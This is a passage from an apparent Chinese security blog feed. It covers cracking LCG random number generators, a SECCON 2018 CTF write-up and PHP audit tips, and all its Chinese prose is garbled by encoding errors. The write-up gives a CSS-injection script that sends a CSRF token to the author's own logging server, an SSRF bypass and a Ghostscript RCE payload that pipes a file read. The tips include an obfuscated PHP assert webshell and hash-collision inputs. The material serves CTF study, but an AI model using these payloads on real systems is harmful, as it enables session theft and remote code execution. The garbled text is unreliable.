n)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s1 - (s0*m + c) = k_1 * n</span><br><span class="line">s2 - (s1*m + c) = k_2 * n</span><br><span class="line">s3 - (s2*m + c) = k_3 * n</span><br></pre></td></tr></table></figure><p>è¿™å°±ç›¸å½“äºå…­ä¸ªæœªçŸ¥æ•°å’Œä¸‰ä¸ªæ–¹ç¨‹ã€‚æ‰€ä»¥çº¿æ€§æ–¹ç¨‹ç»„æ˜¯ä¸å¯èƒ½è¡Œå¾—é€šçš„äº†ï¼Œä½†æ˜¯æ•°è®ºé‡Œé¢æœ‰ä¸€æ¡å¾ˆæœ‰ç”¨:å¦‚æœæœ‰å‡ ä¸ªéšæœºæ•°åˆ†åˆ«ä¹˜ä»¥nï¼Œé‚£ä¹ˆè¿™å‡ ä¸ªæ•°çš„æ¬§å‡ é‡Œå¾·ç®—æ³•(gcd)å°±å¾ˆå¯èƒ½ç­‰äºnã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [944]: n = 123456789</span><br><span class="line"></span><br><span class="line">In [945]: reduce(gcd, [randint(1, 1000000)*n, randint(1, 1000000)*n, randint(1, 1000000)*n])</span><br><span class="line">Out[945]: 123456789</span><br></pre></td></tr></table></figure><p>æŸäº›å–æ¨¡è¿ç®—æ˜¯ä¼šç­‰äº0çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X = 0 (mod n)</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œæ ¹æ®å®šä¹‰ï¼Œè¿™ç›¸å½“äºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X = k*n</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™ç§X != 0ä½†æ˜¯X = 0 (mod n)çš„æƒ…å†µå°±å¾ˆæœ‰è¶£ã€‚æˆ‘ä»¬åªéœ€è¦å–å‡ ä¸ªè¿™æ ·çš„å€¼è¿›è¡Œgcdè¿ç®—ï¼Œæˆ‘ä»¬å°±å¯ä»¥è§£å‡ºnçš„å€¼ã€‚è¿™ç§æ˜¯åœ¨æ¨¡æ•°æœªçŸ¥çš„æƒ…å†µä¸‹ååˆ†å¸¸ç”¨çš„æ–¹æ³•ã€‚</p><p>æˆ‘ä»¬åœ¨æ­¤å¼•å…¥ä¸€ä¸ªåºåˆ— â€“ T(n) = S(n+1) - S(n):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t0 = s1 - s0</span><br><span class="line">t1 = s2 - s1 = (s1*m + c) - (s0*m + c) = m*(s1 - s0) = m*t0 (mod n)</span><br><span class="line">t2 = s3 - s2 = (s2*m + c) - (s1*m + c) = m*(s2 - s1) = m*t1 (mod n)</span><br><span class="line">t3 = s4 - s3 = (s3*m + c) - (s2*m + c) = m*(s3 - s2) = m*t2 (mod n)</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœäº†:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t2*t0 - t1*t1 = (m*m*t0 * t0) - (m*t0 * m*t0) = 0 (mod n)</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç”Ÿæˆå‡ ä¸ªè¿™æ ·æ¨¡æ˜¯0çš„å€¼ï¼Œè¿›è€Œåˆ©ç”¨æˆ‘ä»¬ä¸Šæ–‡è®²è¿°çš„æŠ€å·§ï¼Œæ­¤ç§ç±»å‹Pythonæ”»å‡»ä»£ç å¦‚ä¸‹æ‰€ç¤º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def crack_unknown_modulus(states):</span><br><span class="line">    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]</span><br><span class="line">    modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">    return crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line">print crack_unknown_modulus([2818206783446335158, 3026581076925130250,</span><br><span class="line">    136214319011561377, 359019108775045580, 2386075359657550866, 1705259547463444505])</span><br></pre></td></tr></table></figure><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>æ­¤å¤„æˆ‘ä»¬ç®€è¿°äº†å¯¹LCGçš„æ”»å‡»æ–¹å¼ï¼Œè¿™ç§æ–¹å¼åˆšåœ¨P.W.N CTFä¸­å‡ºç°è¿‡ï¼Œå…·ä½“çš„é¢˜ç›®ä»¥åŠè§£ç­”å¯ä»¥å‚è€ƒæˆ‘çš„ä¸‹ä¸€ç¯‡æ–‡ç« â€“ã€ŠP.W.N. CTFã€‹ä¸­çš„LCG and the Xé¢˜ç›®è§£æã€‚</p><h2 id="0x04-å‚è€ƒ"><a href="#0x04-å‚è€ƒ" class="headerlink" title="0x04 å‚è€ƒ"></a>0x04 å‚è€ƒ</h2><p><a href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator" target="_blank" rel="noopener">Cryptographically secure pseudorandom number generator</a></p><p><a href="https://en.wikipedia.org/wiki/Lenstra%E2%80%93Lenstra%E2%80%93Lov%C3%A1sz_lattice_basis_reduction_algorithm" target="_blank" rel="noopener">Lenstraâ€“Lenstraâ€“LovÃ¡sz lattice basis reduction algorithm</a></p><p><a href="https://tailcall.net/blog/cracking-randomness-lcgs/" target="_blank" rel="noopener">Cracking RNGs: Linear Congruential Generators</a></p><p><a href="https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm#Python" target="_blank" rel="noopener">Algorithm Implementation/Mathematics/Extended Euclidean algorithm</a></p><p><a href="https://zh.wikipedia.org/wiki/%E7%B7%9A%E6%80%A7%E5%90%8C%E9%A4%98%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">çº¿æ€§åŒä½™æ–¹æ³•</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;ç›®å‰æˆ‘ä»¬åœ¨ç¼–ç¨‹ä¸­ç»å¸¸ä¼šä½¿ç”¨éšæœºæ•°ï¼Œä½†æ˜¯å…¶ä¸­ä¼šä¸ä¼šå­˜åœ¨ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿè¦çŸ¥é“CPUè®¡ç®—ä¸­çš„å„ç§çŠ¶æ€éƒ½æ˜¯ç¡®å®š
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SECCON 2018 Qualis GhostKingdom</title>
    <link href="http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/"/>
    <id>http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/</id>
    <published>2018-10-29T15:25:57.000Z</published>
    <updated>2018-10-29T15:35:24.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-é—®é¢˜åˆ†æ"><a href="#0x00-é—®é¢˜åˆ†æ" class="headerlink" title="0x00 é—®é¢˜åˆ†æ"></a>0x00 é—®é¢˜åˆ†æ</h3><p>é¢˜ç›®é“¾æ¥:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ghostkingdom.pwn.seccon.jp/FLAG/</span><br></pre></td></tr></table></figure><p>è®¿é—®é“¾æ¥åçš„æç¤ºå¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG is somewhere in this folder.   GO TO TOP</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢:</p><p><img src="https://i.loli.net/2018/10/29/5bd6e42077582.png" alt="å±å¹•å¿«ç…§ 2018-10-29 ä¸‹åˆ6.41.59.png"></p><p>ä¸€é€šæ“ä½œåå‘ç°æ²¡æœ‰æ³¨å…¥ï¼Œæ‰€ä»¥è·Ÿç€é€»è¾‘æ³¨å†Œç™»å½•ç»§ç»­å¾€ä¸‹çœ‹ã€‚</p><p>ç™»å½•åå‘ç°ä¾§é¢æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼Œä½†æ˜¯ä¸Šä¼ åŠŸèƒ½è¢«ç¦æ­¢äº†ï¼Œæ ‡è¯†åªæœ‰ä»æœ¬åœ°ç™»å½•æ‰å¯ä»¥ä½¿ç”¨ã€‚å°è¯•ä¿®æ”¹xxfç­‰æ–¹å¼å¹¶æ²¡æœ‰æˆåŠŸï¼Œæ‰€ä»¥çŒœæµ‹å¯èƒ½æ˜¯cookieè®¤è¯é—®é¢˜ï¼Ÿ</p><p><img src="https://i.loli.net/2018/10/29/5bd6e489ec36b.png" alt="å±å¹•å¿«ç…§ 2018-10-29 ä¸‹åˆ6.44.14.png"></p><p>ä½†æˆ–è€…ä¸Šä¼ å¤„ä¸æ˜¯å…³é”®ç‚¹ï¼Œå…ˆä»ä¸Šé¢ä¸¤ä¸ªåŠŸèƒ½å¼€å§‹æµ‹è¯•ã€‚é¦–å…ˆæµ‹è¯•<code>Message to admin</code>ï¼Œåˆšå¼€å§‹çŒœæµ‹å¯èƒ½æ­¤å¤„ä¼šä¸ä¼šæœ‰ä¸€ä¸ªxss botï¼Œæ‰“ä¸ªcookieå›æ¥ã€‚è™½ç„¶è¿™ä¸ªè¾“å…¥æ¡†ä¹Ÿä¸å­˜åœ¨xssï¼Œä¹Ÿæ²¡æœ‰botå‘¨æœŸæ€§åœ°æˆ³ä¸€ä¸‹ï¼Œä½†æ˜¯åœ¨burpæŠ“åŒ…ä¸­åˆ†æåˆ°ä¸€ä¸ªcsså‚æ•°å¯æ§ã€‚è”æƒ³åˆ°å¯èƒ½æ˜¯CSS æ³¨å…¥è¯»æ•°æ®è¿™ä¸ªç‚¹ï¼Œä½†æ˜¯æˆ‘è¿˜ç¼ºå°‘ä¸€ä¸ªä»æœ¬åœ°æˆ³æˆ³æˆ³çš„botï¼</p><p><img src="https://i.loli.net/2018/10/29/5bd6e6960b699.png" alt="å±å¹•å¿«ç…§ 2018-10-29 ä¸‹åˆ6.50.11.png"></p><p><img src="https://i.loli.net/2018/10/29/5bd6e6675902f.png" alt="å±å¹•å¿«ç…§ 2018-10-29 ä¸‹åˆ6.51.21.png"></p><p>æ­¤å¤„æˆ‘ä»¬decodeä¸€ä¸‹è¿™ä¸ªbase64å¯ä»¥çœ‹åˆ°æ˜¯æ§åˆ¶æ­¤å¤„çš„è¾“å‡ºæ ·å¼ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros î‚° ~/Desktop î‚° echo -n &quot;c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&quot; | base64 -D</span><br><span class="line">span&#123;background-color:red;color:yellow&#125;</span><br></pre></td></tr></table></figure><p>ç‚¹å‡»send to adminä¹‹åæˆ‘çœ‹åˆ°ä¸€ä¸ªcsrfå‚æ•°(æœ‰ç”¨ï¼Ÿ)</p><p><img src="https://i.loli.net/2018/10/29/5bd6e7a284b0f.png" alt="å±å¹•å¿«ç…§ 2018-10-28 ä¸‹åˆ10.36.50.png"></p><p>å¥½åƒæ— æ³•ä½†ä»è¿™ä¸€ä¸ªç‚¹å…¥æ‰‹ï¼Œæ‰€ä»¥æˆ‘å†³å®šçœ‹çœ‹<code>Take a screenshot</code>ã€‚</p><p><img src="https://i.loli.net/2018/10/29/5bd719ee71628.png" alt="å±å¹•å¿«ç…§ 2018-10-29 ä¸‹åˆ10.31.41.png"></p><p>å¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªssrf,ä¸è¿‡fileç­‰åè®®éƒ½è¢«é™åˆ¶äº†ï¼Œ302è·³è½¬å¥½åƒä¹Ÿæ²¡å¼€ã€‚è™½ç„¶é™åˆ¶äº†127ç­‰ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®<code>http://0/</code>ç»•è¿‡ï¼Œç»“æœè¿˜æ˜¯æœ‰æƒŠå–œçš„ã€‚</p><p><img src="https://i.loli.net/2018/10/29/5bd71b0ff2538.png" alt="å±å¹•å¿«ç…§ 2018-10-29 ä¸‹åˆ10.36.37.png"></p><p>PS:æ‰«æè¿‡ç¨‹ä¸­å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ghostkingdom.pwn.seccon.jp/ghostMagick.cgi</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/29/5bd722370feba.png" alt="å±å¹•å¿«ç…§ 2018-10-29 ä¸‹åˆ11.07.14.png"></p><p><strong>å°ç»“:</strong></p><p>æœ¬æ¥æˆ‘ä»¥ä¸ºè¿™é¢˜æ˜¯ä¸‰ä¸ªç‚¹åˆ†åˆ«çªç ´éƒ½å¯ä»¥è·å–flagï¼Œä½†ç°åœ¨çœ‹æ¥ä¸è¡Œï¼ŒçœŸæ˜¯ç»§æ‰¿äº†KeigoYAMAZAKIä¸€è´¯çš„å‡ºé¢˜é£æ ¼ï¼Œè¦ç»¼åˆä»¥ä¸Šä¿¡æ¯ï¼Œæ„é€ åˆ©ç”¨é“¾æ¥è¯»å–flag</p><h3 id="0x01-è§£é¢˜æ­¥éª¤"><a href="#0x01-è§£é¢˜æ­¥éª¤" class="headerlink" title="0x01 è§£é¢˜æ­¥éª¤"></a>0x01 è§£é¢˜æ­¥éª¤</h3><p>é¦–å…ˆ<code>Take a screenshot</code>å¤„çš„ssrfå¯ä»¥è®©æˆ‘ä»¬ä»<code>local network</code>é‚£é‡Œè¿›è¡Œç™»å½•ï¼Œç™»å½•ä¹‹åå¯ä»¥æ“ä½œ<code>Upload image</code>ã€‚</p><p><img src="https://i.loli.net/2018/10/29/5bd71fe91e67e.png" alt="å±å¹•å¿«ç…§ 2018-10-28 ä¸‹åˆ10.32.30.png"></p><p>ä½†æ˜¯ä»…é€šè¿‡è¿™ä¸ªæœ‰é™åˆ¶çš„ssrfæ— æ³•è¿›ä¸€æ­¥åˆ©ç”¨äº†ã€‚æ‰€ä»¥æ¢ä¸€ä¸ªè§’åº¦è€ƒè™‘ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä»<code>local network</code>è·å–<code>CGISESSID</code>åœ¨<code>from internet</code>è¿›è¡Œç™»å½•å°±å¯ä»¥ä½¿ç”¨<code>Upload image</code>åŠŸèƒ½äº†å‘¢ï¼Ÿ</p><p>æœ‰äº†è¿™ä¸ªæ€è·¯æ¥ä¸‹æ¥å°±æ˜¯è·å–<code>CGISESSID</code>äº†ï¼Œè”æƒ³åˆ°<code>Message to admin</code>è¿˜æœ‰ä¸€ä¸ªcss injectå¯ä»¥ç”¨æ¥è¯»å–æ•°æ®ï¼Œæ‰€ä»¥å°±å¯ä»¥ssrf+css injectè”åˆæ¥è·å–<code>CGISESSID</code>ã€‚</p><p>æ­¤å¤„å¯ä»¥å‚è€ƒ: <a href="https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html" target="_blank" rel="noopener">Reading Data via CSS Injection</a></p><p>æœåŠ¡å™¨ä¸Šä½¿ç”¨phpå¼€ä¸ªæœåŠ¡å™¨æ¥è®°å½•æ•°æ®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:2333</span><br></pre></td></tr></table></figure></p><p>å¯¹åº”çš„ç›®å½•ä¸‹å¯ä»¥æ”¾ç½®å¦‚ä¸‹log.phpæ¥å¸®åŠ©è®°å½•<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&apos;Asia/Shanghai&apos;);</span><br><span class="line">$ip       = $_SERVER[&quot;REMOTE_ADDR&quot;]; //è®°å½•è®¿é—®è€…çš„ip</span><br><span class="line">$filename = $_SERVER[&apos;PHP_SELF&apos;];//è®¿é—®è€…è¦è®¿é—®çš„æ–‡ä»¶å</span><br><span class="line">$parameter   = $_SERVER[&quot;QUERY_STRING&quot;]; //è®¿é—®è€…è¦è¯·æ±‚çš„å‚æ•°</span><br><span class="line">$time     =   date(&apos;Y-m-d H:i:s&apos;,time()); //è®¿é—®æ—¶é—´</span><br><span class="line">$logadd = &apos;æ¥è®¿æ—¶é—´ï¼š&apos;.$time.&apos;--&gt;&apos;.&apos;è®¿é—®é“¾æ¥ï¼š&apos;.&apos;http://&apos;.$ip.$filename.&apos;?&apos;.$parameter.&quot;\r\n&quot;;</span><br><span class="line">// logè®°å½•</span><br><span class="line">$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);</span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line">fclose($fh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>åˆ©ç”¨è„šæœ¬å¦‚ä¸‹:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">CHARLIST = &quot;0123456789&quot; + &quot;abcdef&quot;</span><br><span class="line">URL = &quot;http://0/?msg=master&amp;action=msgadm2&amp;css=&quot;</span><br><span class="line">#</span><br><span class="line">known = &quot;bcc703c0693e6eff894ede&quot;</span><br><span class="line">buf = &quot;&quot;</span><br><span class="line">for char in CHARLIST:</span><br><span class="line">    buf += &quot;&quot;&quot;input[name=&quot;csrf&quot;][value^=&quot;&#123;&#125;&quot;] &#123;&#123;</span><br><span class="line">background: url(http://your server ip/log.php/&#123;&#125;);</span><br><span class="line">&#125;&#125;&quot;&quot;&quot;.format(known+char,known+char)</span><br><span class="line"></span><br><span class="line">print(URL + base64.b64encode(buf.encode(&apos;utf-8&apos;)).decode(&apos;utf-8&apos;))</span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆå¯ä»¥è·å–<code>CGISESSID</code>çš„å€¼<br><img src="https://i.loli.net/2018/10/29/5bd7217a4e6c3.png" alt="å±å¹•å¿«ç…§ 2018-10-29 ä¸‹åˆ11.04.08.png"></p><p>ä¹‹ååœ¨æµè§ˆå™¨ä¸­è®¾ç½®ä¸Šæˆ‘ä»¬è·å¾—çš„<code>CGISESSID</code>ï¼Œå°±å¯ä»¥ä½¿ç”¨<code>Upload image</code>åŠŸèƒ½äº†ã€‚</p><p><img src="https://i.loli.net/2018/10/29/5bd722a10d369.png" alt="å±å¹•å¿«ç…§ 2018-10-28 ä¸‹åˆ11.41.21.png"></p><p>æµ‹è¯•ä¸€ä¸‹<br><img src="https://i.loli.net/2018/10/29/5bd722f902495.png" alt="å±å¹•å¿«ç…§ 2018-10-29 ä¸‹åˆ11.10.10.png"></p><p><img src="https://i.loli.net/2018/10/29/5bd722f8ee474.png" alt="å±å¹•å¿«ç…§ 2018-10-29 ä¸‹åˆ11.10.37.png"></p><p>å‘ç°æœ‰ä¸ª<code>Convert to GIF format</code>ç»“åˆä¹‹å‰æˆ‘ä»¬å‘ç°çš„<code>ghostMagick.cgi</code>å¾ˆå®¹æ˜“æƒ³åˆ°Ghostscriptçš„rceæ¼æ´ã€‚æˆ‘ä»¬å°†ä»¥ä¸‹ä»£ç ä¿å­˜ä¸ºjpgï¼Œä¸Šä¼ å¯ä»¥å¾—flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%cat /var/www/html/FLAG/FLAGflagF1A8.txt) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/29/5bd723bdf3a02.png" alt="å±å¹•å¿«ç…§ 2018-10-29 ä¸Šåˆ12.03.49.png"></p><p><code>SECCON{CSSinjection+GhostScript/ImageMagickRCE}</code></p><h3 id="0x03-å‚è€ƒ"><a href="#0x03-å‚è€ƒ" class="headerlink" title="0x03 å‚è€ƒ"></a>0x03 å‚è€ƒ</h3><p><a href="https://graneed.hatenablog.com/entry/2018/10/28/150722" target="_blank" rel="noopener">https://graneed.hatenablog.com/entry/2018/10/28/150722</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-é—®é¢˜åˆ†æ&quot;&gt;&lt;a href=&quot;#0x00-é—®é¢˜åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;0x00 é—®é¢˜åˆ†æ&quot;&gt;&lt;/a&gt;0x00 é—®é¢˜åˆ†æ&lt;/h3&gt;&lt;p&gt;é¢˜ç›®é“¾æ¥:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHPä»£ç å®¡è®¡ä¸­çš„ä¸€äº›Tips</title>
    <link href="http://zer0yu.github.io/2018/10/13/php-audit-tips/"/>
    <id>http://zer0yu.github.io/2018/10/13/php-audit-tips/</id>
    <published>2018-10-13T11:15:36.000Z</published>
    <updated>2019-03-13T04:47:51.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-eregi"><a href="#1-eregi" class="headerlink" title="1.eregi"></a>1.eregi</h4><p>æ­¤å‡½æ•°å¯ä»¥è¢«%00æˆªæ–­</p><p>æ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œå¯ä»¥ä½¿ç”¨$b=â€%001111â€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//%00å¥½åƒç®—ä¸€ä¸ªå­—èŠ‚</span><br><span class="line">if(strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">    require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œå¦‚æœä¼ å…¥æ•°ç»„ï¼Œå‡½æ•°ä¼šæŠ¥é”™å¹¶è¿”å›NULLã€‚</p><h4 id="2-assert"><a href="#2-assert" class="headerlink" title="2.assert"></a>2.assert</h4><p>PHPä¸­çš„assertå¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPå‡½æ•°ï¼Œè¿›è€Œè¿›è¡Œgetshellç­‰æ“ä½œï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹ä»£ç è¿›è¡Œç›®å½•æ‰«æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$poc = &quot;a#s#s#e#r#t&quot;;</span><br><span class="line">$poc_1 = explode(&quot;#&quot;, $poc);$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5];</span><br><span class="line">$poc_2($_GET[&apos;s&apos;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload <code>s=print_r(scandir(&#39;./&#39;));</code></p><h4 id="3-md5-amp-sha1"><a href="#3-md5-amp-sha1" class="headerlink" title="3.md5&amp;sha1"></a>3.md5&amp;sha1</h4><p>PHPä¸­çš„md5å’Œsha1å‡½æ•°å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€æ˜¯ä»–ä»¬å¤„ç†æ•°ç»„éƒ½è¿”å›nullï¼›ç¬¬äºŒåœ¨å¼±ç±»å‹æ¡ä»¶ä¸‹ä»–ä»¬ä¼šè®¤ä¸ºå¦‚ä¸‹çš„è¿”å›å€¼ç›¸åŒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br><span class="line"> sha1(str)</span><br><span class="line">sha1(&apos;aaroZmOk&apos;)  </span><br><span class="line">sha1(&apos;aaK1STfY&apos;)</span><br><span class="line">sha1(&apos;aaO8zKZF&apos;)</span><br><span class="line">sha1(&apos;aa3OFF9m&apos;)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šå¦‚æœä½¿ç”¨äº†md5å¹¶ä¸”æ˜¯å¼ºç›¸ç­‰ï¼Œé‚£ä¹ˆæ‰¾åˆ°æ•°æ®å¯¹åº”md5ç›¸åŒçš„å€¼å³å¯ï¼Œåœ¨æ­¤ç»™å‡ºä¸€ç»„æŸå¼ºç½‘æ¯ä½¿ç”¨è¿‡çš„æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">#008ee33a9d58b51cfeb425b0959121c9</span><br></pre></td></tr></table></figure><p>æ­¤å¤–æˆ‘ä»¬è§‚å¯Ÿå®šä¹‰å¯ä»¥å¾—åˆ°å¦å¤–ä¸€ç‚¹ï¼Œé€šè¿‡è®¾ç½®raw_outputå‚æ•°çš„å€¼ä¸ºtrueï¼Œæˆ‘ä»¬å¯ä»¥è¾¾åˆ°ä¸€ä¸ª\ï¼Œä»è€Œè¿›è¡Œsqlæ³¨å…¥</p><blockquote><p>string md5 ( string $str [, bool $raw_output = false ] )</p><p>str<br>åŸå§‹å­—ç¬¦ä¸²ã€‚</p><p>raw_output<br>å¦‚æœå¯é€‰çš„ raw_output è¢«è®¾ç½®ä¸º TRUEï¼Œé‚£ä¹ˆ MD5 æŠ¥æ–‡æ‘˜è¦å°†ä»¥16å­—èŠ‚é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(md5(128,true));</span><br><span class="line">string(16) 